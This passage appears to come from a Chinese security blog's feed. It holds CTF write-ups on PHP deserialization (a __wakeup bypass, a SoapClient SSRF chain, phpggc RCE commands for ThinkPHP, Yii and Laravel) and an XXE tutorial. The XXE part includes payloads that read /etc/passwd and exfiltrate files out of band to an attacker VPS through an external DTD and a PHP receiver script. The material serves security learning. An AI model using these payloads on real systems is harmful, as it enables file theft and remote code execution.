href="#PHP反序列化-原生类TIPS-CVE绕过漏洞-属性类型特征" class="headerlink" title="PHP反序列化&amp;原生类TIPS&amp;CVE绕过漏洞&amp;属性类型特征"></a>PHP反序列化&amp;原生类TIPS&amp;CVE绕过漏洞&amp;属性类型特征</h3><ul><li><p>CVE-2016-7124（__wakeup绕过）—[极客大挑战 2019]PHP</p><p><img src="/assets/image-20240831175210-2qgy0iu.png" alt="image-20240831175210-2qgy0iu">​</p><p>下载源码分析</p><p><img src="/assets/image-20240831175350-p3aysmm.png" alt="image-20240831175350-p3aysmm">​</p><p><img src="/assets/image-20240831175417-p952w45.png" alt="image-20240831175417-p952w45">​</p><p><img src="/assets/image-20240831175438-ykjc5iz.png" alt="image-20240831175438-ykjc5iz">​</p><p>分析会触发调用__wakeup 强制修改username值</p><p><img src="/assets/image-20240831175533-sptispr.png" alt="image-20240831175533-sptispr">​</p><p><img src="/assets/image-20240831175549-wqfnmd0.png" alt="image-20240831175549-wqfnmd0">​</p><p><img src="/assets/image-20240831175625-nm3g8ne.png" alt="image-20240831175625-nm3g8ne">​</p><p>使用pop链构造payload(把private改为public)</p><p><img src="/assets/image-20240831175707-euzgpyx.png" alt="image-20240831175707-euzgpyx">​</p><p><img src="/assets/image-20240831175725-qex8y4l.png" alt="image-20240831175725-qex8y4l">​</p><p>利用语言漏洞绕过 CVE-2016-7124，修改满足漏洞条件触发</p><p><img src="/assets/image-20240831175807-wl806m4.png" alt="image-20240831175807-wl806m4">​</p><p>Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">select=O%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>admin%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22100</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p><img src="/assets/image-20240831175854-awl7iyk.png" alt="image-20240831175854-awl7iyk">​</p></li><li><p>原生类—CTFshow-259</p><p>题目</p><p><img src="/assets/image-20240831194603-bmpux9r.png" alt="image-20240831194603-bmpux9r">​</p><p>这里flag.php要求</p><p>1、ip必须为127.0.0.1</p><p>2、以post方式接收token值，如果token值为ctfshow则会把flag写入flag.txt</p><p><img src="/assets/image-20240831194519-7rcl7re.png" alt="image-20240831194519-7rcl7re">​</p><p>在首页及flag.php都没看到有魔术方法</p><p>无代码通过原生类SoapClient(只生成_call方法的原生类)</p><p><img src="/assets/image-20240831194828-94kkoxe.png" alt="image-20240831194828-94kkoxe">​</p><p>查询</p><p><img src="/assets/image-20240831195222-y1y079y.png" alt="image-20240831195222-y1y079y">​</p><p>构造pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ua</span>=<span class="hljs-string">&quot;aaa\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;<br><span class="hljs-variable">$client</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://127.0.0.1/&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-variable">$ua</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$client</span>));<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/assets/image-20240831195315-rlp5a12.png" alt="image-20240831195315-rlp5a12">​</p><p><img src="/assets/image-20240831195359-ichfzoi.png" alt="image-20240831195359-ichfzoi">​</p><p>通过访问本地flag.txt获取Flag</p><p><img src="/assets/image-20240831195417-sjuq6jm.png" alt="image-20240831195417-sjuq6jm">​</p></li><li><p>字符串逃逸—CTFshow</p><p>极速版</p><p>62 fuck  &#x3D; 62 loveu &#x3D; 310位数</p><p>310位数 loveu +”;s:3:”msg”;s:1:”a”;s:2:”to”;s:1:”b”;s:5:”token”;s:5:”admin”;}<br>被正确的解析 token admin</p><p>O:7:”message”:4:{s:4:”from”;s:310:”loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU”;s:3:”msg”;s:1:”a”;s:2:”to”;s:1:”b”;s:5:”token”;s:5:”admin”;}”;s:3:”msg”;s:1:”a”;s:2:”to”;s:1:”b”;s:5:”token”;s:4:”user”;}</p></li></ul><p>‍</p><h3 id="PHP反序列化-CLI框架类-PHPGGC生成器-TP-Yii-Laravel利用"><a href="#PHP反序列化-CLI框架类-PHPGGC生成器-TP-Yii-Laravel利用" class="headerlink" title="PHP反序列化&amp;CLI框架类&amp;PHPGGC生成器&amp;TP&amp;Yii&amp;Laravel利用"></a>PHP反序列化&amp;CLI框架类&amp;PHPGGC生成器&amp;TP&amp;Yii&amp;Laravel利用</h3><ul><li><p>反序列化框架利用(phpggc)</p><ol><li><p>ThinkPHP</p><p> [安洵杯 2019]iamthinking Thinkphp V6.0.X 反序列化</p><p> <img src="/assets/image-20240901195034-vzscbxj.png" alt="image-20240901195034-vzscbxj">​</p><ol><li><p><a href="http://www.zip下载源码/">www.zip下载源码</a></p></li><li><p>查看源码</p><p> <img src="/assets/image-20240901195114-5vpkw1t.png" alt="image-20240901195114-5vpkw1t">​</p><p> <img src="/assets/image-20240901195131-dy5cxk3.png" alt="image-20240901195131-dy5cxk3">​</p><p> <img src="/assets/image-20240901195148-jkg4w5i.png" alt="image-20240901195148-jkg4w5i">​</p><p> <img src="/assets/image-20240901195206-fpyal3r.png" alt="image-20240901195206-fpyal3r">​</p></li><li><p>这里使用phpggc帮助我们生成一个thinkphp反序列化利用链(假设网上没有相关漏洞POC给你，但是你知道这个版本的thinkphp存在反序列化这种情况下)</p><p> <img src="/assets/image-20240901195327-bdtq61l.png" alt="image-20240901195327-bdtq61l">​</p><p> <code>./phpggc ThinkPHP/RCE3 system &#39;cat /flag&#39; --url</code>​</p><p> <img src="/assets/image-20240901195349-9c2kqdy.png" alt="image-20240901195349-9c2kqdy">​</p></li><li><p><code>http://d67438dd-6483-4c05-bc40-1095050b015a.node4.buuoj.cn:81///public/?payload=</code>​</p><p> <img src="/assets/image-20240901195423-1hgomcl.png" alt="image-20240901195423-1hgomcl">​</p><p> <img src="/assets/image-20240901195436-xq4ct5e.png" alt="image-20240901195436-xq4ct5e">​</p></li></ol></li><li><p>Yii</p><ol><li><p>弱口令登录</p><p> <img src="/assets/image-20240901195535-hem3emp.png" alt="image-20240901195535-hem3emp">​</p></li><li><p>登录后，源码提示泄漏<br> GET：index.php?r=site%2Fabout&amp;view-source</p><p> <img src="/assets/image-20240901195626-68x9609.png" alt="image-20240901195626-68x9609">​</p><p> <img src="/assets/image-20240901195647-6kb65o0.png" alt="image-20240901195647-6kb65o0">​</p><p> <img src="/assets/image-20240901195709-dqjp1ks.png" alt="image-20240901195709-dqjp1ks">​</p><p> <img src="/assets/image-20240901195732-rd9pil6.png" alt="image-20240901195732-rd9pil6">​</p></li><li><p><code>./phpggc Yii2/RCE1 exec &#39;cp /fla* tt.txt&#39; --base64</code>​</p><p> <img src="/assets/image-20240901195801-ahor7py.png" alt="image-20240901195801-ahor7py">​</p></li><li><p>GET：<code>/index.php?r=backdoor/shell&amp;code=</code>​</p><p> <img src="/assets/image-20240901195840-1jwmt86.png" alt="image-20240901195840-1jwmt86">​</p></li><li><p><img src="/assets/image-20240901195854-241635c.png" alt="image-20240901195854-241635c">​</p></li></ol></li><li><p>Laravel</p><ol><li><p><img src="/assets/image-20240901195920-81bgfkd.png" alt="image-20240901195920-81bgfkd">​</p></li><li><p><img src="/assets/image-20240901195942-i0z572w.png" alt="image-20240901195942-i0z572w">​</p></li><li><p>但是没有发现具体版本,只能一个一个试</p><p> <img src="/assets/image-20240901200035-htaiuup.png" alt="image-20240901200035-htaiuup">​</p></li><li><p><code>./phpggc Laravel/RCE1 system &quot;whoami&quot; --url</code>​</p><p> <img src="/assets/image-20240901200150-j56nvpk.png" alt="image-20240901200150-j56nvpk">​</p></li></ol></li></ol></li></ul><p>‍</p><p>‍</p><h2 id="JAVA篇"><a href="#JAVA篇" class="headerlink" title="JAVA篇"></a>JAVA篇</h2><h2 id="Python篇"><a href="#Python篇" class="headerlink" title="Python篇"></a>Python篇</h2>]]></content>
    
    
    <categories>
      
      <category>WEB攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB攻防</tag>
      
      <tag>反序列化漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE漏洞🦋</title>
    <link href="/2024/03/26/XXE%E6%BC%8F%E6%B4%9E%F0%9F%A6%8B/"/>
    <url>/2024/03/26/XXE%E6%BC%8F%E6%B4%9E%F0%9F%A6%8B/</url>
    
    <content type="html"><![CDATA[<p>优质好文<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">CTF XXE - MustaphaMond - 博客园 (cnblogs.com)</a></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>XXE全称为XML External Entity Injection即XMl外部实体注入漏洞</p><p>XXE就是XML外部实体注入。当应用程序允许引用外部实体时，通过构造恶意内容，就可以 导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><code>XML</code>​即 可扩展标记语言，类似HTML，为了传输和存储数据，标签是没有被预定义的，需要自行定义标签</p><p>特点：纯文本，他不会做任何事情，可以自己发明标签</p><p>作用： 拿来做配置文件，交换数据 传输数据 外部实体就是要从外部引进来的变量</p><p>产生漏洞的本质：外部实体(是可以加载外部的变量内容=&gt;发起了网络请求了)有点类似与SSRF</p><p>‍</p><h3 id="与HTML的区别"><a href="#与HTML的区别" class="headerlink" title="与HTML的区别"></a>与HTML的区别</h3><ul><li>HTML 被设计用来显示数据</li><li>XML 被设计用来传输和存储数据</li></ul><p>‍</p><h3 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h3><ul><li>XML声明</li><li>DTD文档类型定义（可选）</li><li>文档元素</li></ul><p>‍</p><h3 id="支持的协议"><a href="#支持的协议" class="headerlink" title="支持的协议"></a>支持的协议</h3><p>file php伪协议 http gopher</p><p>‍</p><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。</p><p>DTD一般认为有两种引用或声明方式：</p><ul><li>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。</li><li>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</li></ul><p>DTD实体有以下几种声明方式</p><h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY a <span class="hljs-string">&quot;admin&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>&amp;a<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-comment">&lt;!-- admin --&gt;</span><br></code></pre></td></tr></table></figure><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span>&gt;</span> [<br>    <span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-string">&quot;&lt;!ENTITY b1 &quot;</span>awsl<span class="hljs-string">&quot;&gt;&quot;</span>&gt;</span><br>    %b;<br>]&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>&amp;b1<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-comment">&lt;!-- awsl --&gt;</span><br></code></pre></td></tr></table></figure><ul><li>参数实体用<code>% name</code>​申明，引用时用<code>%name;</code>​，只能在DTD中申明，DTD中引用。</li><li>其余实体直接用<code>name</code>​申明，引用时用<code>&amp;name;</code>​，只能在DTD中申明，可在xml文档中引用</li></ul><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span>&gt;</span> [<br>    <span class="hljs-meta">&lt;!ENTITY c <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span><br>]&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>&amp;c<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-comment">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span><br></code></pre></td></tr></table></figure><h3 id="外部参数实体"><a href="#外部参数实体" class="headerlink" title="外部参数实体"></a>外部参数实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span>&gt;</span> [<br>    <span class="hljs-meta">&lt;!ENTITY % d <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://47.106.143.26/xml.dtd&quot;</span>&gt;</span><br>    %d;<br>]&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>&amp;d1<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-comment">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h1 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h1><h2 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h2><ol><li><p>根据<code>Content-Type</code>​，以及数据格式判断</p><p> <img src="/assets/image-20240825213943-2nyqvqg.png" alt="image">​</p></li><li><p>不管获取的Content-Type类型或数据传输类型是否是XML，均尝试修改为XML格式后提交测试</p><p> <img src="/assets/image-20240825214129-giz0h7u.png" alt="image">​</p></li><li><p>XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行(百度docx xxeb即可)</p><p> 参考：<a href="https://blog.csdn.net/weixin_57567655/article/details/124588490">https://blog.csdn.net/weixin_57567655/article/details/124588490</a></p></li></ol><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><p>1、可通过应用功能追踪代码定位审计<br>2、可通过脚本特定函数搜索定位审计<br>3、可通过伪协议玩法绕过相关修复等</p><p>‍</p><h3 id="JAVA中审计函数"><a href="#JAVA中审计函数" class="headerlink" title="JAVA中审计函数"></a>JAVA中审计函数</h3><p>审计的函数</p><ol><li>XMLReader</li><li>SAXReader</li><li>DocumentBuilder</li><li>XMLStreamReader</li><li>SAXBuilder</li><li>SAXParser</li><li>SAXSource</li><li>TransformerFactory</li><li>SAXTransformerFactory</li><li>SchemaFactory</li><li>Unmarshaller</li><li>XPathExpression</li></ol><p>‍</p><p>‍</p><p>‍</p><h1 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h1><p>‍</p><h2 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h2><p><img src="/assets/image-20240825214848-2c8in9r.png" alt="image">​</p><p><img src="/assets/image-20240825215016-tek1lt4.png" alt="image">​</p><ul><li><p>读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE xiaodi [<br>&lt;!ENTITY test SYSTEM  <span class="hljs-string">&quot;file:///d:/1.txt&quot;</span>&gt;<br>]&gt;<br>&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure><p><img src="/assets/image-20240825215127-2jsisc9.png" alt="image">​</p><p><img src="/assets/image-20240825215147-viil88m.png" alt="image">​</p></li><li><p>外部实体引用dtd</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE test [<br>    &lt;!ENTITY % file SYSTEM <span class="hljs-string">&quot;http://172.25.186.34:8000/xxe.dtd&quot;</span>&gt;<br>    %file;<br>]&gt;<br>&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure><p>xxe.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY send SYSTEM &quot;file:///d:/1.txt&quot;&gt;<br></code></pre></td></tr></table></figure><p><img src="/assets/image-20240825215830-o6jngxq.png" alt="image">​</p></li></ul><p>‍</p><h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><ul><li><p>带外测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE test [<br>    &lt;!ENTITY % file SYSTEM <span class="hljs-string">&quot;http://9v57ll.dnslog.cn&quot;</span>&gt;<br>    %file;<br>]&gt;<br>&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure><p><img src="/assets/image-20240825220132-rnqewu2.png" alt="image">​</p><p><img src="/assets/image-20240825220240-xdkldoh.png" alt="image">​</p><p>或者不用dnslog，直接在VPS服务器上用python起一个WEB服务，然后看这个有没有请求记录即可</p></li><li><p>读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE ANY[<br>&lt;!ENTITY % file SYSTEM <span class="hljs-string">&quot;file:///d:/1.txt&quot;</span>&gt;<br>&lt;!ENTITY % remote SYSTEM <span class="hljs-string">&quot;http://172.25.186.34:8000/xxe.dtd&quot;</span>&gt;<br>%remote;<br>%all;<br>]&gt;<br>&lt;root&gt;&amp;send;&lt;/root&gt;<br></code></pre></td></tr></table></figure><p><img src="/assets/image-20240825220730-xrbnutr.png" alt="image">​</p><p><img src="/assets/image-20240825220747-q762n2y.png" alt="image">​</p><p>xxe.dtd（放在vps上）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!ENTITY % all <span class="hljs-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://172.25.186.34:8000/get.php?file=%file;&#x27;&gt;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>get.php（放在vps上）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;file.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$data</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里若文件中有空格和中文均无法读取，此时可以使用php伪协议解决</p><p><code>php://filter/read=convert.base64-encode/resource=phpinfo.php</code>​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE ANY[<br>&lt;!ENTITY % file SYSTEM <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=D:/1.txt&quot;</span>&gt;<br>&lt;!ENTITY % remote SYSTEM <span class="hljs-string">&quot;http://172.25.186.34:8000/xxe.dtd&quot;</span>&gt;<br>%remote;<br>%all;<br>]&gt;<br><br><br>&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;<br><br></code></pre></td></tr></table></figure></li></ul><p>‍</p><p>‍</p><p>‍</p><h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><p>禁用实体解析的代码</p><ul><li><p>PHP:</p><p>libxml_disable_entity_loader(true);</p></li><li><p>JAVA:</p><p>DocumentBuilderFactory dbf</p><p>=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</p></li><li><p>Python：</p><p>from lxml import etreexmlData =</p><p>etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p></li></ul><p>‍</p><p>‍</p><p>‍</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h1><ul><li><p>黑盒</p><p>漏洞URL：<a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p><p>抓包</p><p>​<img src="/assets/image-20240825221408-yoizwxd.png" alt="image">​</p><p>更改请求数据格式：Content-Type为xml格式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY f <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span><span class="hljs-symbol">&amp;f;</span><span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​<img src="/assets/image-20240825221502-ybvmsqo.png" alt="image">​</p></li><li><p>白盒</p><p>1、搜索漏洞函数simplexml_load_string</p><p><img src="/assets/image-20240825221535-m55z2o3.png" alt="image">​</p><p>2、pe_getxml函数调用了漏洞函数\</p><p><img src="/assets/image-20240825221556-4lqkkfy.png" alt="image">​</p><p><img src="/assets/image-20240825221612-wxr848u.png" alt="image">​</p><p>3、wechat_getxml调用了pe_getxml</p><p><img src="/assets/image-20240825221635-lch5g2c.png" alt="image">​</p><p><img src="/assets/image-20240825221653-4coyk8a.png" alt="image">​</p><p>4、notify_url.php调用了wechat_getxml</p><p><img src="/assets/image-20240825221713-lx1dkqk.png" alt="image">​</p><p>5、访问notify_url文件触发wechat_getxml函数,构造Paylod测试</p><p><img src="/assets/image-20240825221735-7lys2y8.png" alt="image">​</p><p><img src="/assets/image-20240825221748-rdz2dr3.png" alt="image">​</p><p><img src="/assets/image-20240825221802-9thf7x6.png" alt="image">​</p><p><img src="/assets/image-20240825221818-s7p12zv.png" alt="image">​</p><p>先尝试读取文件，无回显后带外测试：</p><p><img src="/assets/image-20240825221915-8tiu72k.png" alt="image">​</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://1uwlwv.dnslog.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %file;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;send;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/assets/image-20240825221951-fkn2sag.png" alt="image">​</p><p><img src="/assets/image-20240825222007-pi4vm85.png" alt="image">​</p><p>存在XXE漏洞</p><p>然后带外传递数据解决无回显：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span 